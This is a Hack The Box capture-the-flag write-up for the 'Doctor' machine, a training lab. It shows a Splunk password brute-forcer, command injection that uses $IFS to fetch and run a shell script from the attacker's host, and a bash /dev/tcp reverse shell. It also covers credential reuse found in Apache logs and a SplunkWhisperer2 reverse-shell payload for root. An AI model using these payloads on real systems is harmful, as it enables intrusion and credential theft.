---
title: "Doctor"
difficulty: Easy
os: Linux
points: 20
rating: 4
date: 2020-09-26
avatar: assets/htb/doctor.png
tags: [Remote Code Execution, Clear Text Credentials, Misconfiguration, Server Side Template Injection (SSTI), SIEM, Web Application, Vulnerability Assessment, Injections]
htb_url: https://app.hackthebox.com/machines/Doctor
---
## Enumeration

### Nmap scan

I kicked things off with an nmap scan against `<YOUR_IP>`. My usual flags are: `-p-` to scan every port, `-sC` (the same as `--script=default`) to fire the default NSE enumeration scripts at the host, `-sV` for service/version detection, and `-oA <name>` to save the results under the filename `<name>`.

```text
┌──(kac0㉿kali)-[~/htb/doctor]
└─$ nmap -sCV -n -p- -Pn -v -oA doctor <YOUR_IP>                                              130 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-07 17:55 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 17:55
Completed NSE at 17:55, 0.00s elapsed
Initiating NSE at 17:55
Completed NSE at 17:55, 0.00s elapsed
Initiating NSE at 17:55
Completed NSE at 17:55, 0.00s elapsed
Initiating Connect Scan at 17:55
Scanning <YOUR_IP> [65535 ports]
Discovered open port 80/tcp on <YOUR_IP>
Discovered open port 22/tcp on <YOUR_IP>
Connect Scan Timing: About 18.79% done; ETC: 17:58 (0:02:14 remaining)
Discovered open port 8089/tcp on <YOUR_IP>                                                           
Connect Scan Timing: About 46.81% done; ETC: 17:57 (0:01:09 remaining)                                  
Completed Connect Scan at 17:57, 106.48s elapsed (65535 total ports)                                    
Initiating Service scan at 17:57                                                                        
Scanning 3 services on <YOUR_IP>                                                                     
Completed Service scan at 17:57, 31.27s elapsed (3 services on 1 host)                                  
NSE: Script scanning <YOUR_IP>.                                                                      
Initiating NSE at 17:57                                                                                 
Completed NSE at 17:58, 8.63s elapsed
Initiating NSE at 17:58
Completed NSE at 17:58, 0.57s elapsed
Initiating NSE at 17:58
Completed NSE at 17:58, 0.00s elapsed
Nmap scan report for <YOUR_IP>
Host is up (0.063s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-06T15:57:27
| Not valid after:  2023-09-06T15:57:27
| MD5:   db23 4e5c 546d 8895 0f5f 8f42 5e90 6787
|_SHA-1: 7ec9 1bb7 343f f7f6 bdd7 d015 d720 6f6f 19e2 098b
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 17:58
Completed NSE at 17:58, 0.00s elapsed
Initiating NSE at 17:58
Completed NSE at 17:58, 0.00s elapsed
Initiating NSE at 17:58
Completed NSE at 17:58, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 147.33 seconds
```

Just three ports were listening: 22 - SSH, 80 - HTTP, and 8089 - Splunk

### Port 80 - HTTP

![](assets/wu/doctor/img-1.png)

Port 80 served a health care site; the contact details exposed the domain info@doctors.htb

![](assets/wu/doctor/img-2.png)

Scrolling further down, I spotted some likely usernames: Dr. Jade Guzman, Dr. Hannah Ford, Dr. James Wilson

### Port 8089 - Splunk

![](assets/wu/doctor/img-3.png)

This required https. Once I clicked through the self-signed certificate warnings, I landed on a Splunk Atom Feed. It reports Splunk build: 8.0.5

![](assets/wu/doctor/img-4.png)

Clicking the services link popped a credential prompt

[https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)

> Universal Forwarder is accessible on each host at [https://host:8089](https://host:8089). Accessing any of the protected API calls, such as /service/ pops up a Basic authentication box. The username is always admin, and the password default used to be changeme until 2016 when Splunk required any new installations to set a password of 8 characters or higher.

I put together a small python password brute forcer

* [https://requests.readthedocs.io/en/master/user/advanced/\#ssl-cert-verification](https://requests.readthedocs.io/en/master/user/advanced/#ssl-cert-verification)
* [https://stackoverflow.com/questions/15445981/how-do-i-disable-the-security-certificate-check-in-python-requests](https://stackoverflow.com/questions/15445981/how-do-i-disable-the-security-certificate-check-in-python-requests)

```python
import requests
from urllib3.exceptions import InsecureRequestWarning

headers = {
'Host': '<YOUR_IP>:8089',
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate',
'Connection': 'close',
'Referer': 'https://<YOUR_IP>:8089/',
'Upgrade-Insecure-Requests': '1',
'DNT': '1',
'Sec-GPC': '1'
}

auth = "Authorization: Basic admin:changeme"

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

print("Starting password brute force...\n")

with open("/home/kac0/rockyou_utf8.txt", "r") as rockyou:
    for password in rockyou:
            r = requests.get('https://<YOUR_IP>:8089/services', auth=('admin', password), headers = headers, verify = False)
            if r.status_code == 200:
                print(f"The password is: {password}\n")
                break
            else:
                continue

print("Thank you for using this service!\n")
```

The brute force led nowhere

![](assets/wu/doctor/img-5.png)

Next I browsed to doctors.htb, which bounced me to a login page

![](assets/wu/doctor/img-6.png)

Probing it for SQLi just returned the error " Nope, no such luck. "

![](assets/wu/doctor/img-7.png)

The page source revealed a link to /archive,

![](assets/wu/doctor/img-8.png)

 but that page was empty with nothing on it

![](assets/wu/doctor/img-9.png)

I signed up for an account

![](assets/wu/doctor/img-10.png)

Once the account was created, a banner across the top warned that it would only last 20 minutes.

![](assets/wu/doctor/img-11.png)

I ran a few simple XSS checks

![](assets/wu/doctor/img-12.png)

My post showed up, but opening it triggered no alert.

![](assets/wu/doctor/img-13.png)

I then dropped a link to my box into the Content field; the app claimed the link was invalid, yet I still received a callback to my machine

```text
┌──(kac0㉿kali)-[~/htb/doctor]
└─$ nc -lvnp 8081
listening on [any] 8081 ...
connect to [10.10.15.77] from (UNKNOWN) [<YOUR_IP>] 39234
GET / HTTP/1.1
Host: 10.10.15.77:8081
User-Agent: curl/7.68.0
Accept: */*
```

So the backend is invoking `curl`. If the input isn't sanitized, this could give me code execution.

![](assets/wu/doctor/img-14.png)

```text
┌──(kac0㉿kali)-[~/htb/doctor]
└─$ nc -lvnp 8081                                                                                130 ⨯
listening on [any] 8081 ...
connect to [10.10.15.77] from (UNKNOWN) [<YOUR_IP>] 39242
GET /uid=1001(web) HTTP/1.1
Host: 10.10.15.77:8081
User-Agent: curl/7.68.0
Accept: */*
```

Appending a command to my URL caused the request to come back with `id` output, confirming the service runs as the user `web`. 

I attempted my usual enumeration like `cat /etc/passwd`, but commands containing spaces wouldn't work. Anything I sent with a space failed to call back to my machine.

* [https://www.betterhacker.com/2016/10/command-injection-without-spaces.html](https://www.betterhacker.com/2016/10/command-injection-without-spaces.html)

No luck

* [https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces](https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces)

by default, bash's $IFS expands to a space

![](assets/wu/doctor/img-15.png)

Once I realized I could substitute `$IFS` for the spaces, I fired off plenty of commands to enumerate the box. \(As shown below, each attempt only returned a small amount of information.\)

```text
┌──(kac0㉿kali)-[~/htb/doctor]
└─$ python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
<YOUR_IP> - - [07/Feb/2021 21:19:26] code 404, message File not found
<YOUR_IP> - - [07/Feb/2021 21:19:26] "GET /blog HTTP/1.1" 404 -
<YOUR_IP> - - [07/Feb/2021 21:20:21] "GET / HTTP/1.1" 200 -
<YOUR_IP> - - [07/Feb/2021 21:20:38] code 404, message File not found
<YOUR_IP> - - [07/Feb/2021 21:20:38] "GET /root:x:0:0:root:/root:/bin/bash HTTP/1.1" 404 -
<YOUR_IP> - - [07/Feb/2021 21:21:12] code 404, message File not found
<YOUR_IP> - - [07/Feb/2021 21:21:12] "GET /root:x:0:0:root:/root:/bin/bash HTTP/1.1" 404 -
<YOUR_IP> - - [07/Feb/2021 21:22:49] code 404, message File not found
<YOUR_IP> - - [07/Feb/2021 21:22:49] "GET /bin HTTP/1.1" 404 -
<YOUR_IP> - - [07/Feb/2021 21:23:00] code 404, message File not found
<YOUR_IP> - - [07/Feb/2021 21:23:00] "GET /blog HTTP/1.1" 404 -
<YOUR_IP> - - [07/Feb/2021 21:24:20] code 404, message File not found
<YOUR_IP> - - [07/Feb/2021 21:24:20] "GET /root:x:0:0:root:/root:/bin/bash HTTP/1.1" 404 -
<YOUR_IP> - - [07/Feb/2021 21:26:43] code 404, message File not found
<YOUR_IP> - - [07/Feb/2021 21:26:43] "GET /pulse:x:123:128:PulseAudio HTTP/1.1" 404 -
<YOUR_IP> - - [07/Feb/2021 21:37:28] "GET / HTTP/1.1" 200 -
<YOUR_IP> - - [07/Feb/2021 21:38:46] "GET / HTTP/1.1" 200 -                                          
<YOUR_IP> - - [07/Feb/2021 21:41:23] "GET / HTTP/1.1" 200 -                                          
<YOUR_IP> - - [07/Feb/2021 21:41:32] "GET / HTTP/1.1" 200 -                                          
<YOUR_IP> - - [07/Feb/2021 21:41:53] "GET / HTTP/1.1" 200 -                                          
<YOUR_IP> - - [07/Feb/2021 21:42:13] code 404, message File not found                                
<YOUR_IP> - - [07/Feb/2021 21:42:13] "GET /blog HTTP/1.1" 404 -
<YOUR_IP> - - [07/Feb/2021 21:43:12] code 404, message File not found
<YOUR_IP> - - [07/Feb/2021 21:43:12] "GET //usr/bin:/bin HTTP/1.1" 404 -
<YOUR_IP> - - [07/Feb/2021 21:45:15] "GET / HTTP/1.1" 200 -
<YOUR_IP> - - [07/Feb/2021 21:45:30] code 404, message File not found
<YOUR_IP> - - [07/Feb/2021 21:45:30] "GET /splunk:x:1003:1003:Splunk HTTP/1.1" 404 -
<YOUR_IP> - - [07/Feb/2021 21:46:42] "GET /shaun:x:1002:1002:shaun,,,:/home/shaun:/bin/bash HTTP/1.1" 404 -
```

I worked out how to read `/etc/passwd` a line at a time with `tail -n`;

![](assets/wu/doctor/img-16.png)

I was hoping Wireshark might reveal more of the output, but it didn't.

![](assets/wu/doctor/img-17.png)

 Using `tail -n2` I turned up the username `shaun`. I then attempted to drop my SSH key into `shaun`'s`authorized_keys` file, but that failed. So I switched to grabbing a reverse shell by uploading a bash script and running it.

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.15.13/8091 0>&1
```

the shell script was just a plain bash reverse shell

```text
title=Passwd+Extract&content=http://10.10.15.13:8081/$(curl$IFS'http://10.10.15.13:8081/shell'$IFS'-o'$IFS'/dev/shm/shell')&submit=Post

title=Passwd+Extract&content=http://10.10.15.13:8081/$(chmod$IFS'+x'$IFS'/dev/shm/shell')&submit=Post

title=Passwd+Extract&content=http%3a//10.10.15.13%3a8081/$(bash$IFS'/dev/shm/shell')&submit=Post
```

The three commands I pushed through in Burp: 

![](assets/wu/doctor/img-18.png)

fetching the file with curl, 

![](assets/wu/doctor/img-19.png)

I confirmed the file had landed and was reachable.

![](assets/wu/doctor/img-20.png)

chmod +x to flag it executable, 

![](assets/wu/doctor/img-21.png)

and finally running my shell script

```text
<YOUR_IP> - - [07/Feb/2021 21:47:19] "GET /exim:x:31:31:Exim HTTP/1.1" 404 -                         
<YOUR_IP> - - [12/Feb/2021 19:16:30] "GET / HTTP/1.1" 200 -                                          
<YOUR_IP> - - [12/Feb/2021 19:17:53] "GET / HTTP/1.1" 200 -
<YOUR_IP> - - [12/Feb/2021 19:18:37] code 404, message File not found
<YOUR_IP> - - [12/Feb/2021 19:18:37] "GET //usr/bin/curl HTTP/1.1" 404 -
<YOUR_IP> - - [12/Feb/2021 19:19:00] "GET / HTTP/1.1" 200 -
<YOUR_IP> - - [12/Feb/2021 19:23:11] "GET / HTTP/1.1" 200 -
<YOUR_IP> - - [12/Feb/2021 19:23:43] "GET /shell HTTP/1.1" 200 -
<YOUR_IP> - - [12/Feb/2021 19:23:44] "GET / HTTP/1.1" 200 -
```

The remote host called back and pulled down my shell script

## Road to User

```text
┌──(kac0㉿kali)-[~/htb/doctor]
└─$ nc -lvnp 8091                                                                                   1 ⨯
listening on [any] 8091 ...
connect to [10.10.15.13] from (UNKNOWN) [<YOUR_IP>] 51260
bash: cannot set terminal process group (867): Inappropriate ioctl for device
bash: no job control in this shell
web@doctor:~$ which python
which python
web@doctor:~$ which python3
which python3
/usr/bin/python3
web@doctor:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
web@doctor:~$ export TERM=xterm-256color
export TERM=xterm-256color
web@doctor:~$
```

When the script executed, the reverse shell connected back to my waiting netcat listener. Python2 was absent, but python3 was present.+-

### Further enumeration

```text
web@doctor:~$ id && hostname
id && hostname
uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
doctor
```

I was the `web` user, and right away I noticed it belonged to the `adm` group.

### Finding user creds

```text
web@doctor:~$ find / -group adm 2>/dev/null
find / -group adm 2>/dev/null
/proc/1037

...snipped...

/proc/1041/arch_status
/var/log/kern.log.3.gz
/var/log/unattended-upgrades
/var/log/auth.log
/var/log/syslog
/var/log/ufw.log.2.gz
/var/log/dmesg.2.gz
/var/log/auth.log.1
/var/log/cups/error_log.1
/var/log/cups/access_log.1
/var/log/cups/access_log.7.gz
/var/log/cups/access_log.3.gz
/var/log/cups/error_log
/var/log/cups/access_log.2.gz
/var/log/cups/error_log.2.gz
/var/log/cups/error_log.3.gz
/var/log/cups/access_log
/var/log/cups/access_log.6.gz
/var/log/cups/access_log.5.gz
/var/log/cups/access_log.4.gz
/var/log/syslog.1
/var/log/apache2
/var/log/apache2/error.log.10.gz
/var/log/apache2/error.log.9.gz
/var/log/apache2/access.log.11.gz
/var/log/apache2/error.log
/var/log/apache2/backup
/var/log/apache2/access.log.2.gz
/var/log/apache2/error.log.6.gz
/var/log/apache2/error.log.1
/var/log/apache2/access.log.1
/var/log/apache2/error.log.14.gz
/var/log/apache2/error.log.3.gz
/var/log/apache2/error.log.5.gz
/var/log/apache2/access.log
/var/log/apache2/access.log.6.gz
/var/log/apache2/access.log.7.gz
/var/log/apache2/access.log.8.gz
/var/log/apache2/error.log.7.gz
/var/log/apache2/access.log.9.gz
/var/log/apache2/error.log.4.gz
/var/log/apache2/error.log.8.gz
/var/log/apache2/access.log.3.gz
/var/log/apache2/access.log.4.gz
/var/log/apache2/error.log.2.gz
/var/log/apache2/error.log.13.gz
/var/log/apache2/access.log.12.gz
/var/log/apache2/error.log.12.gz
/var/log/apache2/access.log.10.gz
/var/log/apache2/error.log.11.gz
/var/log/apache2/access.log.5.gz
/var/log/apt/term.log.1.gz
/var/log/apt/term.log.2.gz
/var/log/apt/term.log
/var/log/ufw.log.3.gz
/var/log/kern.log.2.gz
/var/log/syslog.4.gz
/var/log/dmesg
/var/log/dmesg.0
/var/log/auth.log.2.gz
/var/log/dmesg.4.gz
/var/log/dmesg.1.gz
/var/log/ufw.log.1
/var/log/kern.log.4.gz
/var/log/syslog.5.gz
/var/log/ufw.log
/var/log/dmesg.3.gz
/var/log/syslog.6.gz
/var/log/auth.log.3.gz
/var/log/kern.log
/var/log/syslog.7.gz
/var/log/kern.log.1
/var/log/auth.log.4.gz
/var/log/syslog.2.gz
/var/log/syslog.3.gz
/var/spool/rsyslog
web@doctor:~$
```

membership in `adm` grants read access to process files and the logs under /var/log

![](assets/wu/doctor/img-22.png)

```text
web@doctor:/var/log$ grep password * 2>/dev/null
grep password * 2>/dev/null
auth.log:Feb 12 07:04:10 doctor VGAuth[664]: vmtoolsd: Username and password successfully validated for 'root'.
auth.log:Feb 12 07:04:18 doctor VGAuth[664]: message repeated 14 times: [ vmtoolsd: Username and password successfully validated for 'root'.]
auth.log:Feb 12 07:04:23 doctor VGAuth[664]: vmtoolsd: Username and password successfully validated for 'root'.
auth.log:Feb 12 07:04:24 doctor VGAuth[664]: message repeated 8 times: [ vmtoolsd: Username and password successfully validated for 'root'.]
auth.log:Feb 12 11:11:49 doctor sshd[2744]: Invalid user password from 10.10.14.70 port 39591
auth.log:Feb 12 11:11:49 doctor sshd[2744]: Failed none for invalid user password from 10.10.14.70 port 39591 ssh2
auth.log:Feb 12 11:11:49 doctor sshd[2744]: Postponed keyboard-interactive for invalid user password from 10.10.14.70 port 39591 ssh2 [preauth]
auth.log:Feb 12 11:11:52 doctor sshd[2744]: error: PAM: Authentication failure for illegal user password from 10.10.14.70
auth.log:Feb 12 11:11:52 doctor sshd[2744]: Failed keyboard-interactive/pam for invalid user password from 10.10.14.70 port 39591 ssh2
auth.log:Feb 12 11:11:52 doctor sshd[2744]: Connection closed by invalid user password 10.10.14.70 port 39591 [preauth]
auth.log:Feb 12 11:14:23 doctor sshd[2821]: Invalid user password1 from 10.10.14.70 port 33589
auth.log:Feb 12 11:14:23 doctor sshd[2821]: Failed none for invalid user password1 from 10.10.14.70 port 33589 ssh2
auth.log:Feb 12 11:14:24 doctor sshd[2821]: Postponed keyboard-interactive for invalid user password1 from 10.10.14.70 port 33589 ssh2 [preauth]
auth.log:Feb 12 11:14:26 doctor sshd[2821]: error: PAM: Authentication failure for illegal user password1 from 10.10.14.70
auth.log:Feb 12 11:14:26 doctor sshd[2821]: Failed keyboard-interactive/pam for invalid user password1 from 10.10.14.70 port 33589 ssh2
auth.log:Feb 12 11:14:26 doctor sshd[2821]: Connection closed by invalid user password1 10.10.14.70 port 33589 [preauth]
auth.log.1:Sep 22 13:01:23 doctor sshd[1704]: Failed password for invalid user shaun from 10.10.14.2 port 40896 ssh2
auth.log.1:Sep 22 13:01:28 doctor sshd[1704]: Failed password for invalid user shaun from 10.10.14.2 port 40896 ssh2
```

Grepping these log files for 'password' surfaced nothing useful.

![](assets/wu/doctor/img-23.png)

```text
web@doctor:/var/log/apache2$ grep -i pass * 2>/dev/null
grep -i pass * 2>/dev/null
access.log.1:10.10.14.70 - - [12/Feb/2021:11:17:55 +0100] "GET /.htpasswd HTTP/1.1" 403 438 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
access.log.1:10.10.14.70 - - [12/Feb/2021:11:17:56 +0100] "GET /.htpasswd_ HTTP/1.1" 403 438 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
access.log.1:10.10.14.70 - - [12/Feb/2021:11:17:57 +0100] "GET /.passwd HTTP/1.1" 404 435 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
access.log.1:10.10.14.70 - - [12/Feb/2021:11:21:58 +0100] "GET /bypass HTTP/1.1" 404 435 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
access.log.1:10.10.14.70 - - [12/Feb/2021:11:22:39 +0100] "GET /change_password HTTP/1.1" 404 435 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
access.log.1:10.10.14.70 - - [12/Feb/2021:11:22:40 +0100] "GET /changepassword HTTP/1.1" 404 435 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
access.log.1:10.10.14.70 - - [12/Feb/2021:11:22:48 +0100] "GET /chpasswd HTTP/1.1" 404 435 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
access.log.1:10.10.14.70 - - [12/Feb/2021:11:27:35 +0100] "GET /forgot_password HTTP/1.1" 404 435 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
access.log.1:10.10.14.70 - - [12/Feb/2021:11:27:35 +0100] "GET /forgotpassword HTTP/1.1" 404 435 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
access.log.1:10.10.14.70 - - [12/Feb/2021:11:27:36 +0100] "GET /forgot-password HTTP/1.1" 404 435 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"

...snipped...

access.log.1:10.10.14.96 - - [12/Feb/2021:14:59:39 +0100] "GET /CrackingUnixpasswordfilesforbeginners HTTP/1.1" 404 435 "-" "gobuster/3.1.0"
access.log.1:10.10.14.96 - - [12/Feb/2021:14:59:39 +0100] "GET /BreakingWindows98Passwords HTTP/1.1" 404 435 "-" "gobuster/3.1.0"
access.log.1:10.10.14.96 - - [12/Feb/2021:14:59:39 +0100] "GET /strongpasswords HTTP/1.1" 404 435 "-" "gobuster/3.1.0"
access.log.1:10.10.14.96 - - [12/Feb/2021:14:59:42 +0100] "GET /passport-holder HTTP/1.1" 404 435 "-" "gobuster/3.1.0"
access.log.1:10.10.14.96 - - [12/Feb/2021:15:00:01 +0100] "GET /nt4passw HTTP/1.1" 404 435 "-" "gobuster/3.1.0"
Binary file access.log.13.gz matches
backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
error.log.1:[Fri Feb 12 11:17:55.910884 2021] [authz_core:error] [pid 2637] [client 10.10.14.70:49358] AH01630: client denied by server configuration: /var/www/html/.htpasswd
```

the apache2 directory, though, held an access.log.1 with a lot more logging, including searches about cracking passwords and building strong ones. Then in the `backup` file I found the user trying to reset their password, it looks like they panicked and changed their web password. I figured I'd test whether that password also worked for the other account on the box \(`shaun`\).

### User.txt

```text
web@doctor:/var/log/apache2$ su shaun     
su shaun
Password: Guitar123

shaun@doctor:/var/log/apache2$ ls -la
ls -la
ls: cannot open directory '.': Permission denied
shaun@doctor:/var/log/apache2$ cd ~
cd ~
shaun@doctor:~$ ls -la
ls -la
total 44
drwxr-xr-x 6 shaun shaun 4096 Sep 15 12:51 .
drwxr-xr-x 4 root  root  4096 Sep 19 16:54 ..
lrwxrwxrwx 1 root  root     9 Sep  7 14:31 .bash_history -> /dev/null
-rw-r--r-- 1 shaun shaun  220 Sep  6 16:26 .bash_logout
-rw-r--r-- 1 shaun shaun 3771 Sep  6 16:26 .bashrc
drwxr-xr-x 4 shaun shaun 4096 Sep 22 13:00 .cache
drwx------ 4 shaun shaun 4096 Sep 15 11:14 .config
drwx------ 4 shaun shaun 4096 Sep 15 11:57 .gnupg
drwxrwxr-x 3 shaun shaun 4096 Sep  6 18:01 .local
-rw-r--r-- 1 shaun shaun  807 Sep  6 16:26 .profile
-rw-rw-r-- 1 shaun shaun   66 Sep 15 12:51 .selected_editor
-r-------- 1 shaun shaun   33 Feb 12 07:04 user.txt
shaun@doctor:~$ cat user.txt    
cat user.txt
d1d5************************ffad
```

## Path to Power \(Gaining Administrator Access\)

### Enumeration as `shaun`

```text
shaun@doctor:~$ sudo -l 
sudo -l
[sudo] password for shaun: Guitar123

Sorry, user shaun may not run sudo on doctor.
```

This user had no `sudo` rights. But now that I held valid credentials, the splunkd exploit I'd come across earlier became viable...

```sql
┌──(kac0㉿kali)-[~/htb/doctor]
└─$ sqlite3 site.db .dump                                                                          1 ⨯
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE user (
        id INTEGER NOT NULL, 
        username VARCHAR(20) NOT NULL, 
        email VARCHAR(120) NOT NULL, 
        image_file VARCHAR(20) NOT NULL, 
        password VARCHAR(60) NOT NULL, 
        PRIMARY KEY (id), 
        UNIQUE (username), 
        UNIQUE (email)
);
INSERT INTO user VALUES(1,'admin','admin@doctor.htb','default.gif','$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S');
CREATE TABLE post (
        id INTEGER NOT NULL, 
        title VARCHAR(100) NOT NULL, 
        date_posted DATETIME NOT NULL, 
        content TEXT NOT NULL, 
        user_id INTEGER NOT NULL, 
        PRIMARY KEY (id), 
        FOREIGN KEY(user_id) REFERENCES user (id)
);
INSERT INTO post VALUES(1,'Doctor blog','2020-09-18 20:48:37.55555','A free blog to share medical knowledge. Be kind!',1);
COMMIT;
```

The file `site.db` contained a password hash, though hashcat couldn't crack it.

* [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) 
* [https://github.com/cnotin/SplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2)

![](assets/wu/doctor/img-24.png)

`shaun`'s credentials got me into the `/services` page on the Splunk site.

### Getting a shell

```python
parser = argparse.ArgumentParser()
parser.add_argument('--scheme', default="https")
parser.add_argument('--host', required=True)
parser.add_argument('--port', default=8089)
parser.add_argument('--lhost', required=True)
parser.add_argument('--lport', default=8181)
parser.add_argument('--username', default="admin")
parser.add_argument('--password', default="changeme")
parser.add_argument('--payload', default="bash -c 'bash -i >& /dev/tcp/10.10.15.13/8092 0>&1'")
parser.add_argument('--payload-file', default="payload.sh")
options = parser.parse_args()
```

I had to set a few parameters in the exploit

```text
┌──(kac0㉿kali)-[~/htb/doctor]
└─$ python3 PySplunkWhisperer2_remote.py.1 --host doctors.htb --lhost 10.10.15.13 --lport 9001 --username shaun --password Guitar123 --payload "bash -c 'bash -i >& /dev/tcp/10.10.15.13/8092 0>&1'"
Running in remote mode (Remote Code Execution)
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /tmp/tmp8o0jrwfy.tar
[+] Started HTTP server for remote mode
[.] Installing app from: http://10.10.15.13:9001/
<YOUR_IP> - - [12/Feb/2021 21:34:40] "GET / HTTP/1.1" 200 -
[+] App installed, your code should be running now!

Press RETURN to cleanup
```

### Root.txt

```text
┌──(kac0㉿kali)-[~/htb/doctor]
└─$ nc -lvnp 8092                                                                                   1 ⨯
listening on [any] 8092 ...
connect to [10.10.15.13] from (UNKNOWN) [<YOUR_IP>] 42328
bash: cannot set terminal process group (1134): Inappropriate ioctl for device
bash: no job control in this shell
root@doctor:/# id && hostname
id && hostname
uid=0(root) gid=0(root) groups=0(root)
doctor
root@doctor:/# cd /root
cd /root
root@doctor:/root# cat root.txt
cat root.txt
3ce7************************649f
```
